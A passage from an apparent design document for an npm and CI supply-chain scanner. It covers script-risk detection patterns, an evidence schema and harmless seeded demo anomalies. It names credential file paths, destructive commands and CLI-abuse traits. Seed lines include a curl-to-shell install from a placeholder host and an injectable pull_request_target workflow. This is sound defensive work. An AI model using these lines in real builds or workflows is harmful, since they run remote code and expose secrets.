Score the lifecycle command string and the file it invokes. Suggested weights sum to a 0-100 "script risk".

| Category | Patterns (regex-level) | Weight | Seen in |
|---|---|---|---|
| Network fetch | `https?://`, `require\(['"]https?['"]\)`, `fetch\(`, `axios`, `XMLHttpRequest`, `net\.connect`, `dns\.(lookup|resolve)`, `curl `, `wget `, `Invoke-WebRequest` | 20 | ua-parser-js, axios/plain-crypto-js |
| Download-and-exec | `curl[^|]*\|\s*(ba)?sh`, `wget .*&&.*(sh|chmod \+x)`, `powershell .*-enc`, downloading a runtime (`bun`, `node`, `python`) | 30 | Shai-Hulud 2.0, keyv |
| Process spawn | `child_process`, `\bexec(Sync|File)?\(`, `spawn(Sync)?\(`, `execa`, `shelljs`, `process\.binding` | 15 | nearly all |
| Env / secret reads | `process\.env` enumerated wholesale (`Object.keys(process.env)`, `JSON.stringify(process.env)`), names matching `TOKEN|SECRET|KEY|PASSWORD|AWS_|GITHUB_|NPM_` | 20 | Nx, tj-actions |
| Credential files | `.npmrc`, `.ssh/`, `.aws/credentials`, `.git-credentials`, `.config/gh`, `.kube/config`, `.docker/config.json`, wallet paths, `os.homedir()` + read | 25 | Shai-Hulud, LiteLLM |
| Obfuscation | `eval\(`, `new Function\(`, `Buffer\.from\([^)]*,\s*['"](base64|hex)['"]\)`, `atob\(`, `\\x[0-9a-f]{2}` runs, `_0x[a-f0-9]{4,}` identifiers, `String\.fromCharCode` chains, line > 5,000 chars, entropy > 5.5 | 25 | node-ipc, chalk payload, dforge |
| Dynamic code load | `require\((?!['"])` (non-literal require), `import\(` of a computed string, `vm\.runIn` | 10 | flatmap-stream |
| Persistence / tamper | writes to `~/.bashrc`, `~/.zshrc`, `crontab`, `systemd`, `.github/workflows/`, `.vscode/`, `.claude/`; registering a self-hosted runner | 30 | Nx, SAP CAP, AsyncAPI |
| Self-propagation | `npm publish`, `npm token`, `npm whoami`, `gh repo create`, `gh auth token`, GitHub API with bearer | 30 | Shai-Hulud family |
| AI-agent abuse | spawning `claude`, `gemini`, `q` CLIs with permission-skipping flags | 25 | Nx s1ngularity |
| Anti-forensics | script deletes itself, rewrites own `package.json`, `fs.unlink(__filename)`, detached background process | 20 | axios |
| Destructive | `rm -rf ~`, `fs.rm(..., {recursive:true})` on home, `shutdown`, `shred` | 30 | Shai-Hulud 2.0, TanStack wave |
| Environment gating | checks for `CI`, geo-IP, hostname, `process.platform` before acting | 10 | node-ipc |
| Benign native build (negative weight) | only `node-gyp rebuild`, `prebuild-install`, `husky`, `patch-package`, `opencollective` banner | -20 | FP control |

Banding: 0-19 info, 20-49 medium, 50+ high. The **pattern matches are verified facts** (file, line, regex); the band and the sentence "this looks like a credential stealer" are inference. The kit's `lodahs/scripts/setup.js` scores on env-secret enumeration, URL literal, and filesystem write: about 50.

---

## 3. VERIFIED evidence vs INFERENCE, per heuristic

Rule for the report schema: every finding carries `evidence[]` (each with `source`, `locator` = URL or file:line, `value`, `sha256` of the raw response or file, `retrieved_at`) and a separate `inference` block (`claim`, `confidence`, `based_on` = list of evidence ids). The LLM may only write into `inference`; `evidence[]` is produced by deterministic tools. A finding with zero evidence items is rejected.

| ID | Risk | VERIFIED (reproducible, hashable) | INFERENCE (model / heuristic judgement) |
|---|---|---|---|
| H0 | Known malicious | OSV response containing `MAL-...` for `name@version`; advisory URL; SHA-256 of the response body | "This affects our production path" (needs reachability) |
| H1 | Typosquat | Exact names; computed edit distance and which rule fired; popular-list snapshot hash and rank of the target; downloads API numbers with URL; `time.created`; maintainer lists of both; 404 status | "The name was chosen to impersonate `lodash`"; intent; severity |
| H2 | Unexpected dependency | Git diff hunk of lockfile/manifest (commit SHAs); list of added `name@version`; grep result showing zero imports; packument diff of parent's `dependencies` between two versions | "Unexpected" (depends on team intent); "phantom dependency is malicious" |
| H3 | Suspicious update | Both tarball URLs and SHA-512s; file list diff; script diff; size numbers; entropy value; matched pattern with file:line; `time[version]` | "This update is suspicious / resembles Shai-Hulud"; maliciousness of obfuscated code |
| H4 | Unsafe install script | The literal `scripts.*` strings from the tarball's `package.json`; lockfile `hasInstallScript`; each regex hit with file:line; tarball integrity | Risk band; "would exfiltrate credentials"; whether a native build step is legitimate |
| H5 | Untrusted image | Dockerfile line; resolved digest from registry (`Docker-Content-Digest`); cosign exit status and output; namespace/registry string; previous digest from evidence store | "Untrusted" label (policy decision); risk of an unverified publisher |
| H6 | Lockfile / integrity | Lock entry fields; registry `dist.integrity` with packument URL; recomputed tarball SHA-512; git blame/commit of the change | Whether the change was tampering or a tooling artefact; attacker intent |
| H7 | Unpinned CI | Workflow file:line; the `uses:` string; tag-to-SHA API response; branches-where-head response; advisory id (CVE-2025-30066 etc.) | "This workflow would have leaked secrets"; exploitability in this repo (workflow never run in the demo) |
| H8 | Dependency confusion | Registry HTTP status for the name (URL + status); `.npmrc` contents; public `dist-tags.latest` vs locked version; `time.created` | "Name is internal"; "someone is attempting confusion" |
| H9 | Maintainer change | Two packument snapshots (hashes, timestamps) showing different `maintainers`; `_npmUser` per version; presence/absence of `trustedPublisher` | "Account takeover"; trustworthiness of the new maintainer |
| H10 | Release activity | `time` map values; computed intervals; missing git tag (API 404 URL); version missing from `versions` | "Unusual" relative to project habits; link to compromise |
| H11 | Provenance gap | Attestation endpoint status and body hash; verification tool exit code and log; attested repo/workflow/commit; equality of subject digest and `dist.integrity`; earlier version's attestation for regression | "Gap is risky for this package"; "attested commit looks malicious". Explicitly state: verified provenance is not evidence of benign content |

Practical tips: store raw API responses under `evidence/<run-id>/` with SHA-256 filenames and reference them by hash; record tool name and version for every verification; make the LLM prompt include only evidence ids and require it to cite them, then post-validate that every cited id exists (hallucination control for the Responsible-AI note).

---

## 4. Recommended seeded demo anomalies (harmless, local-only)

Already in the kit: (a) look-alike `lodahs` with `postinstall` from a `file:` tarball, (b) `FROM node:latest`, (c) workflow with `tj-actions/changed-files@v45` + `curl|bash` + `permissions: write-all`, (d) optional lockfile integrity corruption on branch `tampered-integrity`.

Suggested additions. All use local `file:` tarballs, `example.invalid` hosts, or recorded fixtures; nothing is published, no credentials are involved, workflows are never executed. Keep everything that breaks `npm ci` or `docker build` on a separate static-analysis-only branch, like the existing `tampered-integrity`, so the Day 2 build/validate loop still works on `tampered`.

| # | Anomaly | How to seed | Expected detection | Mirrors |
|---|---|---|---|---|
| S1 | **Suspicious update: a package gains an install script and balloons in size** | Create `demo/packages/guardian-demo-strfmt` in two versions. v1.0.0: tiny, no scripts; `npm pack` it and add it on **baseline** (before the `guardian-baseline` tag) as a vendored helper. On `tampered`, bump to v1.0.1 which adds `"preinstall": "node setup.mjs"`, a harmless `setup.mjs` (writes a marker file to the OS temp dir, mentions but never contacts `example.invalid`), and a ~1 MB `math_init.js` filled with a base64-encoded lorem-ipsum blob on a single line. | H3: script added, new files named like known droppers, size > 3x, entropy/long-line hit. H4: script risk band. Lock diff shows only a patch bump. | keyv/cacheable (Aug 2026), Shai-Hulud 2.0, Bitwarden CLI, ua-parser-js |
| S2 | **Phantom dependency added in a patch release** | Make v1.0.1 of the S1 package also declare a new dependency on a second local tarball `plain-crypt-demo@4.2.1` (with its own harmless `postinstall`), which no code imports. | H2: new transitive package unexplained by `package.json`; zero imports; has install script. Nice dependency-path evidence: app -> strfmt -> plain-crypt-demo. | axios / `plain-crypto-js` (Mar 2026), event-stream / flatmap-stream |
| S3 | **Lockfile `resolved` pointing at a non-registry host** | On a static-only branch (`tampered-lockfile`), rewrite one transitive entry (e.g. `node_modules/ms`) so `resolved` is `https://registry.npmjs.example.invalid/ms/-/ms-2.0.0.tgz`, integrity unchanged; commit as "chore: refresh lockfile" with no `package.json` change. Variant: `git+https://github.example.invalid/x/y.git#<40-hex>` under `optionalDependencies`. | H6 rules 1 and 6: host not in allowlist; lock-only commit. Variant also trips H2's git-spec aggravator. | Lockfile-injection research; TanStack orphan-commit `optionalDependencies` (May 2026) |
| S4 | **Dependency-confusion style internal name** | Add `goof-internal-auth@99.10.9` as a `file:` tarball (harmless stub, no scripts). At seed time confirm the name returns 404 from the public registry (read-only GET) and choose another if not. Do **not** add an `.npmrc` scope mapping. | H8: unscoped internal-looking name; public registry status 404 = claimable; version >= 99; no registry pinning. Remediation story: move to an org scope plus `@scope:registry=` mapping. | Birsan (2021), PyTorch `torchtriton` (Dec 2022) |
| S5 | **Pwn-request + script injection workflow, and a tag-pinned scanner action** | Add `.github/workflows/pr-title.yml`: `on: pull_request_target`, a step `run: echo "${{ github.event.pull_request.title }}"`, a checkout of `github.event.pull_request.head.sha`, and `uses: aquasecurity/trivy-action@0.28.0`. Include one correctly SHA-pinned action as a **negative control**. Never run it. | H7: pwn-request, expression injection, known-compromised action on a mutable tag; the negative control is not flagged (shows precision). | Nx s1ngularity (Aug 2025), Trivy/TeamPCP (Feb-Mar 2026), TanStack |
| S6 | **Untrusted / look-alike image and pipe-to-shell in a secondary Dockerfile** | Add `Dockerfile.worker` (not used by the smoke test): `FROM docker.io/nodee/node:18` (typosquatted namespace, never pulled) and `RUN curl -fsSL https://example.invalid/install.sh | sh`. Keep the main Dockerfile's `node:latest` as is. | H5: non-official namespace, namespace typosquat, no digest, pipe-to-shell. Remediation: official image pinned by digest. | Trojanized Docker Hub `kics` images (2026), Docker Hub typosquats, polyfill.io-style mutable origin |
| S7 | **Maintainer change + release burst + provenance regression (replayed fixture)** | The public registry cannot be altered, so add a **fixture registry**: `demo/fixtures/packuments/guardian-demo-pkg.json` with synthetic metadata: v1.0.0-1.0.3 published by `alice` with `trustedPublisher` and `dist.attestations`; v1.0.4/1.0.5/2.0.1 published by `mallory` within 9 minutes, no attestations, `maintainers` changed. Give the Guardian a `--registry-fixtures <dir>` (or serve via a localhost-only Verdaccio). Label it "SYNTHETIC FIXTURE" in the report. | H9 (publisher change, OIDC to token), H10 (burst, multi-line release, age), H11 (provenance regression). | axios (2026), chalk/debug (2025), ua-parser-js (2021), event-stream (2018) |
| S8 | **Lockfile says "no install script", tarball says otherwise** | On the static branch, delete `"hasInstallScript": true` from the `node_modules/lodahs` lock entry. | H4 three-way disagreement: lock flag vs tarball `package.json`. Shows the Guardian recomputes rather than trusting metadata. | General lockfile tampering; "integrity is not intent" lesson from LiteLLM |
| S9 (optional) | **Read-only replay of real known-bad versions** | No install. Put `axios@1.14.1`, `chalk@5.6.1`, `debug@4.4.2`, `nx@21.5.0` in a test-only SBOM fixture and query OSV. | H0 returns real advisory / `MAL-` ids with URLs (confirm ids at demo time; not checked in this research). Strong "verified evidence" moment. | The real incidents |

Demo narrative suggestion: "Each seeded anomaly is a harmless replica of a real incident, and the Guardian explains which one": S1+S2 = "what hit keyv and axios in 2026", (c)+S5 = "tj-actions and Trivy", (a) = typosquat, S4 = dependency confusion, S7 = account takeover. Then Day 2 remediates (a), S1 and (c) with a human approval gate and shows a clean rescan.

Safety checklist for seeds: `"private": true` in every demo package; names prefixed `guardian-demo-` or verified 404; only `example.invalid` hostnames; scripts write only a marker file in the temp dir; never `npm publish`; never execute the seeded workflows; keep build-breaking seeds off the `tampered` branch.

---

## 5. Open items and caveats

- Exact figures marked [B] (tj-actions repo count, Trivy tag counts and exact day, chalk live time and phishing domain, Shai-Hulud 2025 exact dates and package counts, Telnyx/CanisterWorm details) were not re-verified this session.
- Row 29 items are unverified leads from search-result titles only.
- Row 28 rests on a single secondary news source.
- npm API field names (`_npmUser.trustedPublisher`, `dist.attestations`, abbreviated-packument `hasInstallScript`) and the deps.dev / Scorecard / OSV endpoint shapes come from background knowledge; run one `curl` per endpoint on day 1 to confirm before building parsers.
- LiteLLM date: Zscaler says "uncovered March 26, 2026"; other reporting may give 24 March for the upload. Use "late March 2026" on slides.

---

## Sources

Read during this session:

- CISA alert, tj-actions/changed-files CVE-2025-30066 and reviewdog CVE-2025-30154: https://www.cisa.gov/news-events/alerts/2025/03/18/supply-chain-compromise-third-party-github-action-cve-2025-30066
- Nx s1ngularity postmortem: https://nx.dev/blog/s1ngularity-postmortem
- StepSecurity, chalk/debug compromise: https://www.stepsecurity.io/blog/20-popular-npm-packages-compromised-chalk-debug-strip-ansi-color-convert-wrap-ansi
- Unit 42, Shai-Hulud waves 1 and 2: https://unit42.paloaltonetworks.com/npm-supply-chain-attack/
- Unit 42, monitoring npm supply-chain attacks (2026 waves; updated 15 July 2026): https://unit42.paloaltonetworks.com/monitoring-npm-supply-chain-attacks/
- Zscaler, supply-chain attacks surge in March 2026 (axios, LiteLLM): https://www.zscaler.com/blogs/security-research/supply-chain-attacks-surge-march-2026
- ramimac.me TeamPCP tracker (Trivy, follow-ons): https://ramimac.me/teampcp/
- Endor Labs, keyv / cacheable compromise (Aug 2026): https://endorlabs.com/learn/npm-malware-compromises-keyv-and-cacheable-with-500m-weekly-downloads-and-spreads-to-hundreds-of-packages
- Cyber Security News, dforge-mcp compromise (Sept 2026): https://cybersecuritynews.com/ghappier-supply-chain-attack/
- Wikipedia, Slopsquatting: https://en.wikipedia.org/wiki/Slopsquatting

Found in search results but not opened (useful follow-up reading, not used as evidence):

- Aqua, Trivy supply chain attack: https://www.aquasec.com/blog/trivy-supply-chain-attack-what-you-need-to-know/
- Snyk, Trivy GitHub Actions compromise: https://snyk.io/articles/trivy-github-actions-supply-chain-compromise/
- CSA research note, TeamPCP: https://labs.cloudsecurityalliance.org/research/csa-research-note-teampcp-supply-chain-ci-cd-20260324-csa-st/
- Wiz, reviewdog/action-setup: https://wiz.io/blog/new-github-action-supply-chain-attack-reviewdog-action-setup
- Unit 42, GitHub Actions supply chain attack: https://unit42.paloaltonetworks.com/github-actions-supply-chain-attack/
- Wiz, s1ngularity: https://www.wiz.io/blog/s1ngularity-supply-chain-attack
- Datadog, Shai-Hulud 2.0: https://securitylabs.datadoghq.com/articles/shai-hulud-2.0-npm-worm
- SANS, axios compromise: https://sans.org/blog/axios-npm-supply-chain-compromise-malicious-packages-remote-access-trojan
- Socket, openapi-react-query-codegen: https://socket.dev/blog/openapi-react-query-codegen-npm-compromise
- Microsoft, AsyncAPI compromise: https://microsoft.com/en-us/security/blog/2026/07/15/unpacking-asyncapi-npm-supply-chain-compromise-import-time-payload-delivery
- CSA research note, slopsquatting: https://labs.cloudsecurityalliance.org/research/csa-research-note-slopsquatting-ai-supply-chain-20260419-csa/
